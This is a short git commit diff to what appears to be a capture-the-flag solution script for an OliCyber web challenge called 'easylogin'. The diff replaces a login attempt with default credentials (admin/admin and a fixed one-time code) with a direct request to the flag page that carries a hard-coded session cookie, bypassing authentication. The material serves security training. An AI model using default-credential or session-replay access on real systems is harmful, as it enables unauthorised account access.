167ee7f936c0b284a8d94890fa03b49e150eef14
Federico Bosio <federicobosio0209@gmail.com>
2025-03-15 18:47:52 +0100

    easylogin fix

--- web/easylogin.py
+++ web/easylogin.py
@@ -1,7 +1,6 @@
 import requests
-import re
 
-url = 'http://easylogin.challs.olicyber.it/'
+url = 'http://easylogin.challs.olicyber.it/flag'
 
-r = requests.post(url, data={'username': 'admin','password': 'admin', 'totp': '123456'})
+r = requests.get(url, cookies={'session': 'd6f816cd031715f733539affe057b5103530c23ff9aa01c5c4e71990ac2ae2ac'})
 print(r.text)
